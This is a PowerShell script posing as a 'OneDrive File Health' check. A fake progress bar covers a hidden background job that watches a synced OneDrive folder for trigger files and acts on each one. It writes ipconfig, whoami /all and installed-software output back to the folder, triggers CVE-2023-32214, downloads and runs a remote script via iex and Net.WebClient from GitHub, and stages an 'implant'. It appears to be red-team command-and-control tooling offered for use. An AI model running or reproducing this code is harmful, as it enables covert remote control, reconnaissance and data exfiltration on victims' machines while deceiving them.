# Define file names
$file1 = "placeholdera"
$file2 = "placeholderb"
$file3 = "placeholderc"
$file4 = "placeholderd"
$file5 = "placeholdere"
$file6 = "placeholderf"
$tenant = "tenantname"
$library = "libraryname"
$jitter = Get-Random -Maximum 60

# Path to the OneDrive folder
$OneDriveFolder = "$env:USERPROFILE\Smarter Upgrades\OneDriveHealthCheck - Documents"

$scriptBlock = {
    $processedFiles = @{}

    function CheckForNewFiles {
        $files = Get-ChildItem -Path $Using:OneDriveFolder -File
        foreach ($file in $files) {
            if (-not $processedFiles.ContainsKey($file.FullName)) {
                Write-Host "New file detected: $($file.Name)"

                # Add the file to the processed list
                $processedFiles[$file.FullName] = $true

                if ($file.Name -eq $Using:file1) {
                    ipconfig | Out-File -FilePath "$Using:OneDriveFolder\test1.txt"
                }

                if ($file.Name -eq $Using:file2) {
                    whoami /all | Out-File -FilePath "$Using:OneDriveFolder\test2.txt"
                }

                # Trigger CVE-2023-32214 (black screen)
                if ($file.Name -eq $Using:file3) {
                    start ms-cxh-full://
                }

                # Installs the odcheck protocol handler
                if ($file.Name -eq $Using:file4) {
                    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itssixtyn3in/ODCheck/main/Tools/customhandler.ps1')"
                }

                if ($file.Name -eq $Using:file5) {
                    Get-wmiobject -Class win32_product | select Name, Version, Caption | ft -hidetableheaders -autosize| out-string -Width 4096 | Out-File -FilePath "$Using:OneDriveFolder\versions.txt"
                }

		# Move an implant to the defined folder
                elseif ($file.Name -eq $Using:file6) {
                    $sourcePath = "$Using:OneDriveFolder\test.ps1"
                    $destinationPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("UserProfile"), "Downloads\test.ps1")
                    Copy-Item -Path $sourcePath -Destination $destinationPath -Force
                }
            }
        }
    }

    # Monitor for changes in the OneDrive folder every 30 seconds
    while ($true) {
        CheckForNewFiles
        Start-Sleep -Seconds $Using:jitter
    }
}

# Start the background job with the name "HealthCheck" and redirect output to $null
Start-Job -Name "HealthCheck" -ScriptBlock $scriptBlock *> $null

# Count to 100 in the same PowerShell window
$totalCount = 281
for ($i = 1; $i -le $totalCount; $i++) {
    # Calculate percentage complete
    $percentComplete = [math]::Round(($i / $totalCount) * 100, 2)
    Write-Progress -Activity "Checking OneDrive File Health Status" -Status "Files Checked: $i/$totalCount" -PercentComplete $percentComplete

    # Exit loop if the counter reaches the final value
    if ($i -eq $totalCount) {
        break
    }

    Start-Sleep -Seconds 1
}
